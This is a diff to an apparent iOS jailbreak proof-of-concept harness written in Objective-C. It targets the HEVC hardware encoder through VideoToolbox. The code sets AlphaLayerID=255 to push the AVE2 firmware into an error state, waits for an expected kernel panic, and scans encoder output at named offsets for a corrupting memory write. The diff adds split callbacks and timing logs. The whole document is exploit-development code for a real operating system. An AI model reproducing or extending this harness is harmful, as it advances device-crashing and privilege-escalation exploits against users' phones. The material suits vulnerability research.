@@ -3795,6 +3795,43 @@ static void dprep2Callback(
     }
 }
 
+// Isolated trigger-session callback — only watches for -17691
+static void dprep2TriggerCallback(
+    void *ctx, void *sourceFrameRefCon, OSStatus status,
+    VTEncodeInfoFlags infoFlags, CMSampleBufferRef sampleBuffer) {
+    INFO(@"[TRIGGER-CB] status=%d", (int)status);
+    if (status == -17691) {
+        g_dp2Armed = YES;
+        PASS(@"[TRIGGER-CB] -17691 received — armed");
+        return;
+    }
+}
+
+// Isolated observation-session callback — tracks cross-session rejection
+static volatile int g_dp2ObsRejectCount = 0;
+
+static void dprep2ObsCallback(
+    void *ctx, void *sourceFrameRefCon, OSStatus status,
+    VTEncodeInfoFlags infoFlags, CMSampleBufferRef sampleBuffer) {
+    if (status == -17691) {
+        g_dp2ObsRejectCount++;
+        INFO(@"[OBS-CB] -17691 (#%d) — cross-session HEVC rejection",
+             g_dp2ObsRejectCount);
+        return;
+    }
+    if (status != noErr) {
+        g_dp2Errors++;
+        INFO(@"[OBS-CB] error: %d", (int)status);
+        return;
+    }
+    if (sampleBuffer && g_dp2SampleIdx < DPREP2_MAX_SAMPLES) {
+        CFRetain(sampleBuffer);
+        g_dp2Samples[g_dp2SampleIdx] = sampleBuffer;
+        g_dp2SampleIdx++;
+        dp2ArchiveSample(sampleBuffer);
+    }
+}
+
 static NSData *dp2ExtractBitstream(CMSampleBufferRef sbuf) {
     if (!sbuf) return nil;
     CMBlockBufferRef block = CMSampleBufferGetDataBuffer(sbuf);
@@ -3879,7 +3916,7 @@ static void runDPrep2(void) {
     OSStatus status = VTCompressionSessionCreate(
         kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
         (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
-        dprep2Callback, NULL, &triggerSession);
+        dprep2TriggerCallback, NULL, &triggerSession);
 
     if (status != noErr) {
         FAIL(@"Trigger session creation failed: %d", (int)status);
@@ -3893,9 +3930,12 @@ static void runDPrep2(void) {
         (__bridge CFTypeRef)@(255));
     INFO(@"SET AlphaLayerID=255 (pre-prepare): %s", status == noErr ? "OK" : "REJECTED");
 
+    NSDate *prepStart = [NSDate date];
     status = VTCompressionSessionPrepareToEncodeFrames(triggerSession);
+    NSTimeInterval prepDur = [[NSDate date] timeIntervalSinceDate:prepStart];
+    INFO(@"PrepareToEncodeFrames: %d (%.3fs)", (int)status, prepDur);
     if (status != noErr) {
-        FAIL(@"PrepareToEncode failed: %d", (int)status);
+        FAIL(@"PrepareToEncode failed: %d (after %.3fs)", (int)status, prepDur);
         VTCompressionSessionInvalidate(triggerSession);
         CFRelease(triggerSession);
         g_phase2Running = NO;
@@ -3939,11 +3979,16 @@ static void runDPrep2(void) {
     os_log(dLog, "JBPoC-DPREP2v4-ARM %{public}@ archiveMark=%d", armTime, g_dp2ArchiveArmMark);
 
     CMTime armPTS = CMTimeMake(0, 30);
+    NSDate *encStart = [NSDate date];
     status = VTCompressionSessionEncodeFrame(triggerSession, pb,
         armPTS, kCMTimeInvalid, NULL, NULL, NULL);
-    INFO(@"Armed encode submitted (frame 0): %d", (int)status);
+    NSTimeInterval encDur = [[NSDate date] timeIntervalSinceDate:encStart];
+    INFO(@"EncodeFrame: %d (%.3fs)", (int)status, encDur);
 
+    NSDate *cfStart = [NSDate date];
     VTCompressionSessionCompleteFrames(triggerSession, kCMTimeInvalid);
+    NSTimeInterval cfDur = [[NSDate date] timeIntervalSinceDate:cfStart];
+    INFO(@"CompleteFrames: (%.3fs)", cfDur);
 
     // Wait for -17691
     LOG(@"Waiting for -17691 (up to 130s)...");
@@ -3987,20 +4032,26 @@ static void runDPrep2(void) {
     LOG(@"");
     LOG(@"--- STEP 3: OBSERVATION SESSION + READOUT (240s) ---");
 
+    g_dp2ObsRejectCount = 0;
+
     VTCompressionSessionRef obsSession = NULL;
     status = VTCompressionSessionCreate(
         kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
         (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
-        dprep2Callback, NULL, &obsSession);
+        dprep2ObsCallback, NULL, &obsSession);
     if (status != noErr) {
         FAIL(@"Observation session creation failed: %d", (int)status);
         LOG(@"Trigger session stays alive — panic may still come.");
         g_phase2Running = NO;
         return;
     }
+
+    NSDate *obsPrepStart = [NSDate date];
     status = VTCompressionSessionPrepareToEncodeFrames(obsSession);
+    NSTimeInterval obsPrepDur = [[NSDate date] timeIntervalSinceDate:obsPrepStart];
+    INFO(@"Obs PrepareToEncodeFrames: %d (%.3fs)", (int)status, obsPrepDur);
     if (status != noErr) {
-        FAIL(@"Observation PrepareToEncode failed: %d", (int)status);
+        FAIL(@"Observation PrepareToEncode failed: %d (after %.3fs)", (int)status, obsPrepDur);
         VTCompressionSessionInvalidate(obsSession);
         CFRelease(obsSession);
         LOG(@"Trigger session stays alive — panic may still come.");
@@ -4053,10 +4104,16 @@ static void runDPrep2(void) {
         // Encode a canary frame on observation session
         dp2FreeSamples();
         CMTime pts = CMTimeMake(frameNum++, 30);
+        NSDate *obsEncStart = [NSDate date];
         VTCompressionSessionEncodeFrame(obsSession, pb, pts,
             kCMTimeInvalid, NULL, NULL, NULL);
         VTCompressionSessionCompleteFrames(obsSession, kCMTimeInvalid);
+        NSTimeInterval obsEncDur = [[NSDate date] timeIntervalSinceDate:obsEncStart];
         [NSThread sleepForTimeInterval:0.5];
+
+        // Re-check elapsed after encode (which may block)
+        elapsed = (int)[[NSDate date] timeIntervalSinceDate:armDate];
+        now = [fmt stringFromDate:[NSDate date]];
 
         if (g_dp2SampleIdx > 0) {
             NSData *curBS = dp2ExtractBitstream(g_dp2Samples[0]);
@@ -4227,7 +4284,8 @@ static void runDPrep2(void) {
                 INFO(@"T+%03ds: gap (envelope built, waiting for test phase)", elapsed);
             }
         } else {
-            INFO(@"T+%03ds: no output sample (errors: %d)", elapsed, g_dp2Errors);
+            INFO(@"T+%03ds (%@): no output (enc=%.1fs, obs_rejects=%d, errors=%d)",
+                 elapsed, now, obsEncDur, g_dp2ObsRejectCount, g_dp2Errors);
         }
 
         // Check input surface
@@ -4266,12 +4324,22 @@ static void runDPrep2(void) {
     } else {
         INFO(@"No anomalies in bitstream or input over 240s.");
         pocLog(@"");
+        if (g_dp2ObsRejectCount > 0) {
+            PASS(@"*** CROSS-SESSION FINDING: obs session got %d -17691 rejections ***",
+                 g_dp2ObsRejectCount);
+            LOG(@"The HEVC firmware globally rejects encodes after trigger.");
+            LOG(@"Obs session (no Alpha, separate VT session) saw -17691 on every frame.");
+            LOG(@"This is NOT a callback leak — dprep2ObsCallback is isolated.");
+            LOG(@"Implication: videocodecd/AVE2 firmware enters error state that");
+            LOG(@"persists across VT sessions until cleared (reboot?).");
+        }
         INFO(@"Interpretation (see decision tree):");
         INFO(@"  Clean window + fire on default timing (~90-160s) →");
         INFO(@"    model (b) supported but write landed somewhere we're not reading.");
         INFO(@"  Clean window + extended-no-fire (past ~240s) →");
         INFO(@"    Contradicts Q2's decoupling, revisit the model.");
         INFO(@"  Training set: %zu samples, %zu max bytes", trainBS.count, baseMaxLen);
+        INFO(@"  Obs reject count: %d", g_dp2ObsRejectCount);
         if (varMin) {
             int inv = 0;
             for (size_t j = 0; j < baseMaxLen; j++) {
@@ -4280,20 +4348,22 @@ static void runDPrep2(void) {
             INFO(@"  Invariant bytes: %d/%zu (%.1f%%) — these would catch corruption",
                  inv, baseMaxLen, 100.0 * inv / baseMaxLen);
         }
-        os_log(dLog, "JBPoC-DPREP2v4-RESULT NO_HITS train=%zu", trainBS.count);
+        os_log(dLog, "JBPoC-DPREP2v4-RESULT NO_HITS train=%zu obsRejects=%d",
+               trainBS.count, g_dp2ObsRejectCount);
     }
     LOG(@"═══════════════════════════════════════════════");
 
     // Write results
     NSString *resultStr = [NSString stringWithFormat:
-        @"D-PREP-2 v4 RESULT (two-session)\nDate: %@\nARM: %@\n"
+        @"D-PREP-2 v4.1 RESULT (split callbacks)\nDate: %@\nARM: %@\n"
         @"Training samples: %zu\nMax bitstream: %zu\n"
         @"Archive samples: %d (arm mark: %d)\n"
+        @"Obs session -17691 rejections: %d\n"
         @"Q4 offsets: frame#+0xa8, coded_size+0xac, bitstream+0x1270\n"
         @"Hits: %d\nFirst hit: T+%ds\nReport:\n%@\n",
         [NSDate date], armTime, trainBS.count, baseMaxLen,
         g_dp2ArchiveIdx, g_dp2ArchiveArmMark,
-        hitCount, firstHitTime, hitReport];
+        g_dp2ObsRejectCount, hitCount, firstHitTime, hitReport];
     NSString *resultPath = [NSHomeDirectory()
         stringByAppendingPathComponent:@"Documents/dprep2_result.txt"];
     [resultStr writeToFile:resultPath atomically:YES
